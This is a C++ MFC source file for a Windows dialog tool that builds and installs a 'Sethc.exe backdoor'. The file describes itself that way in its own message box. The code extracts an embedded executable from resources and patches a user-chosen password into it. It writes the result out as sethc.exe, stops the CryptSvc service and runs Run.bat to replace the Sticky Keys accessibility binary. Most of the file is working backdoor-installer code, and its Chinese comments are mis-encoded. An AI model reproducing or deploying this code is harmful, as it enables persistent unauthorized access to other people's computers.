
// PayLoadDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PayLoad.h"
#include "PayLoadDlg.h"
#include <winsvc.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CPayLoadDlg �Ի���




CPayLoadDlg::CPayLoadDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CPayLoadDlg::IDD, pParent)
	, m_strPwd(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CPayLoadDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_PASSWORD, m_strPwd);
}

BEGIN_MESSAGE_MAP(CPayLoadDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_BTN_CREATE, &CPayLoadDlg::OnBnClickedBtnCreate)
	ON_EN_CHANGE(IDC_EDIT_PASSWORD, &CPayLoadDlg::OnEnChangeEditPassword)
	ON_BN_CLICKED(IDC_BTN_INSTALL, &CPayLoadDlg::OnBnClickedBtnInstall)
END_MESSAGE_MAP()


// CPayLoadDlg ��Ϣ�������

BOOL CPayLoadDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	GetDlgItem(IDC_BTN_CREATE)->EnableWindow(FALSE);  //���ܴ���
	GetDlgItem(IDC_BTN_INSTALL)->EnableWindow(FALSE);   //���ܰ�װ

	// TODO: �ڴ���Ӷ���ĳ�ʼ������

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CPayLoadDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CPayLoadDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CPayLoadDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CPayLoadDlg::OnEnChangeEditPassword()
{
	UpdateData(TRUE);
	if (!m_strPwd.IsEmpty())
	{
		GetDlgItem(IDC_BTN_CREATE)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_BTN_CREATE)->EnableWindow(FALSE);
	}

}

//����sethc.exe�ļ�
void CPayLoadDlg::OnBnClickedBtnCreate()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	if (m_strPwd.IsEmpty())
	{
		MessageBox(_T("Please Input initial Password!"), _T("Warning"), MB_ICONWARNING);
		return;
	}
	if (IDYES == MessageBox(_T("You will create a Sethc.exe backdoor, Do you want to continue?"), _T("Query"), MB_YESNO))
	{
		//�ͷ�exe�ļ�
		if (ReleaseSethc())  //�ͷųɹ�
		{
			CString strPwdMsg = _T("");
			strPwdMsg.Format(_T("Sethc.exe's password is \"%s\", please keep in mind!"), m_strPwd);
			MessageBox(strPwdMsg, _T("Create Success!"), MB_OK);
			GetDlgItem(IDC_BTN_INSTALL)->EnableWindow(TRUE);  //���԰�װ��
		}
		else
		{
			MessageBox(_T("Sorry ~~~ Sethc.exe Create Failed!"), _T("Create Failed"), MB_OK);
		}
	}
}

bool CPayLoadDlg::ReleaseSethc()
{
	bool bSuccess = true;
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_SETHC), _T("EXE"));
	if (NULL != hRes)
	{
		HGLOBAL hgRes = LoadResource(NULL, hRes);
		if (NULL != hgRes)
		{
			void* pRes = LockResource(hgRes);
			DWORD dwSize = 0;
			dwSize = SizeofResource(NULL, hRes);
			TCHAR* phMem = (TCHAR*)new TCHAR[dwSize + 1];
			if (WriteProcessMemory(GetCurrentProcess(), (void*)phMem, pRes, dwSize, NULL))
			{
				TCHAR szPassWord[MAX_PATH] = _T("AAAAAAAAAAAAAAAA");
				if (FindMem(phMem, dwSize, szPassWord, m_strPwd.GetBuffer(0)))
				{
					HANDLE hFilePath = INVALID_HANDLE_VALUE;
					CString strReleasePath = GetCurDir() + _T("sethc.exe");  //�ͷŵ��ļ�
					hFilePath = CreateFile(strReleasePath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					DWORD dwWrite = 0;
					WriteFile(hFilePath, (void*)phMem, dwSize, &dwWrite, NULL);
					CloseHandle(hFilePath);
				}
				else
				{
					bSuccess = false;
				}
			}
			else
			{
				bSuccess = false;
			}
			GlobalFree(hgRes);
		}
		else
		{
			bSuccess = false;
		}
	
	}
	else
	{
		bSuccess = false;
	}
	return bSuccess;
}

CString CPayLoadDlg::GetCurDir() const
{
	TCHAR  sDrive[_MAX_DRIVE];   
	TCHAR  sDir[_MAX_DIR];   
	TCHAR  sFilename[_MAX_FNAME],Filename[_MAX_FNAME];   
	TCHAR  sExt[_MAX_EXT];   
	GetModuleFileName(AfxGetInstanceHandle(), Filename, MAX_PATH);   
	_tsplitpath(Filename, sDrive, sDir, sFilename, sExt);   
	CString  homeDir(CString(sDrive)   +   CString(sDir));   
	int nLen = homeDir.GetLength();   
	if (_T('\\') != homeDir.GetAt(nLen-1))   
	{
		homeDir += _T('\\');
	}
	return homeDir;   
}

bool CPayLoadDlg::FindMem( IN TCHAR* pMem, IN const int nLen, IN TCHAR* pFrom, IN TCHAR* pTo )
{
	TCHAR szCharf[100] = {0};
	TCHAR szChart[100] = {0};
	TCHAR* pCharg;
	bool bResult = false;
	wcscpy(szCharf, pFrom);
	wcscpy(szChart, pTo);

	for (int nIndex = 0; nIndex < nLen ; nIndex++)
	{
		pCharg = pMem + nIndex;
		if (0 == wcscmp(pCharg, szCharf))
		{
			//����Ҫע����ĸ�����
			if (WriteProcessMemory(GetCurrentProcess(), (void*)(pMem+nIndex), szChart, 2 * wcslen(szChart) + 1, NULL))
			{
				bResult = true;
			}
			break;
		}
	}
	return bResult;
}

//��װsethc.exe
void CPayLoadDlg::OnBnClickedBtnInstall()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	StopServer();
	CString strBatDir = GetCurDir() + _T("Run.bat");
	HINSTANCE hExec = ShellExecute(NULL, _T("open"), strBatDir, NULL, NULL, SW_SHOW);
	if ((DWORD)hExec <= 32)
	{
		MessageBox(_T("Sorry , Install Failed!"), _T("Failed"), MB_OK);
	}
	else
	{
		MessageBox(_T("OK , Install Success!"), _T("Success"), MB_OK);
	}
}

//ֹͣ�ļ������ķ���
void CPayLoadDlg::StopServer()
{
	SC_HANDLE hSC = ::OpenSCManager( NULL, 
		NULL, GENERIC_EXECUTE);
	if( hSC == NULL)
	{
		return ;
	}
	// ���ļ���������
	SC_HANDLE hSvc = ::OpenService( hSC, _T("CryptSvc"),
		SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);
	if( hSvc == NULL)
	{
		::CloseServiceHandle( hSC);
		return ;
	}
	// ��÷����״̬
	SERVICE_STATUS status;
	if( ::QueryServiceStatus( hSvc, &status) == FALSE)
	{
		::CloseServiceHandle( hSvc);
		::CloseServiceHandle( hSC);
		return ;
	}
	//�����������״̬����رշ���
	if( status.dwCurrentState == SERVICE_RUNNING)
	{
		// ֹͣ����
		if( ::ControlService( hSvc, 
			SERVICE_CONTROL_STOP, &status) == FALSE)
		{
			::CloseServiceHandle( hSvc);
			::CloseServiceHandle( hSC);
			return ;
		}
		// �ȴ�����ֹͣ
		while( ::QueryServiceStatus( hSvc, &status) == TRUE)
		{
			::Sleep( status.dwWaitHint);
			if( status.dwCurrentState == SERVICE_STOPPED)
			{
				::CloseServiceHandle( hSvc);
				::CloseServiceHandle( hSC);
				return ;
			}
		}
	}

	::CloseServiceHandle( hSvc);
	::CloseServiceHandle( hSC);
}

BOOL CPayLoadDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if (WM_KEYDOWN == pMsg->message)
	{
		if (VK_RETURN == pMsg->wParam)
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}
